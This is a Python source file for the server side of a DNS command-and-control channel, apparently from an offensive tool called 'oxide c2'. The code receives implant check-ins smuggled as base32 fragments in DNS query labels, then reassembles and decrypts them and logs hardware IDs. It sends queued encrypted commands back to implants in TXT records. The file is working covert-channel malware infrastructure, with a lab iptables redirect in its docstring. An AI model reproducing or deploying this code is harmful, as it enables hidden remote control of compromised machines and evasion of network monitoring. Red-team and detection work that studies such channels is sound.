"""DNS C2 server: authoritative TXT resolver for oxide c2 zone.
UDP :10053. Lab: iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 10053

Fragment format:
  label 1: {session_6hex}{total_2hex}{idx_2hex}  (10 chars)
  label 2: BASE32NOPAD(fragment_bytes)
  Heartbeat: total=00, idx=00 -> return pending command in TXT
"""

import base64
import gzip
import json
import logging
import threading
import time
from dataclasses import dataclass, field
from typing import Optional

from dnslib import DNSRecord, RR, QTYPE, TXT
from dnslib.server import DNSServer as _DS, BaseResolver

from .crypto import derive_key, encrypt_stateless, decrypt_stateless
from .registry import Registry

log = logging.getLogger(__name__)
_TTL = 30  # fragment expiry seconds


def _b32d(s: str) -> bytes:
    u = s.upper()
    return base64.b32decode(u + "=" * ((8 - len(u) % 8) % 8))


def _b32e(b: bytes) -> str:
    return base64.b32encode(b).decode().rstrip("=")


def _meta(lbl: str) -> tuple[str, int, int]:
    if len(lbl) < 10:
        raise ValueError(f"short label: {lbl!r}")
    return lbl[:6], int(lbl[6:8], 16), int(lbl[8:10], 16)


@dataclass
class _Msg:
    total: int
    frags: dict = field(default_factory=dict)
    ts: float = field(default_factory=time.monotonic)

    def done(self) -> bool:
        return len(self.frags) == self.total

    def old(self) -> bool:
        return time.monotonic() - self.ts > _TTL

    def data(self) -> bytes:
        return b"".join(self.frags[i] for i in range(self.total))


class _Resolver(BaseResolver):
    def __init__(self, key: bytes, reg: Registry):
        self._k = key
        self._r = reg
        self._p: dict[str, _Msg] = {}
        self._lk = threading.Lock()

    def resolve(self, req: DNSRecord, handler) -> DNSRecord:
        rep = req.reply()
        try:
            qn = str(req.q.qname).rstrip(".").lower()
            labels = qn.split(".")
            if len(labels) < 3:
                return rep
            session, total, idx = _meta(labels[0])
            if total == 0 and idx == 0:
                self._evict()
                cmd = self._r.pop_dns_command(session)
                if cmd:
                    ct = encrypt_stateless(self._k, json.dumps(cmd).encode())
                    rep.add_answer(RR(
                        rname=req.q.qname,
                        rtype=QTYPE.TXT,
                        ttl=0,
                        rdata=TXT([_b32e(ct).encode()]),
                    ))
            else:
                fb = _b32d(labels[1])
                mk = f"{session}:{total}"
                with self._lk:
                    if mk not in self._p:
                        self._p[mk] = _Msg(total=total)
                    self._p[mk].frags[idx] = fb
                    m = self._p[mk]
                if m.done():
                    self._assemble(session, mk, m)
        except Exception as e:
            log.debug("resolver: %s", e)
        return rep

    def _assemble(self, session: str, mk: str, m: _Msg) -> None:
        with self._lk:
            self._p.pop(mk, None)
        try:
            plain = decrypt_stateless(self._k, m.data())
            pkt = json.loads(gzip.decompress(plain))
            if pkt.get("packet_type") == "checkin":
                self._r.register_dns_session(session, pkt.get("data", {}))
                log.info("DNS checkin: session=%s hwid=%s",
                         session, pkt.get("data", {}).get("hwid", "?"))
        except Exception as e:
            log.warning("assemble error session=%s: %s", session, e)

    def _evict(self) -> None:
        with self._lk:
            for k in [k for k, m in self._p.items() if m.old()]:
                del self._p[k]


class DnsServer:
    def __init__(self, port: int, psk: str, salt: bytes, registry: Registry):
        self._res = _Resolver(derive_key(psk, salt), registry)
        self._port = port

    def start(self) -> None:
        log.info("DNS C2 on UDP :%d", self._port)
        _DS(self._res, port=self._port, address="0.0.0.0").start()
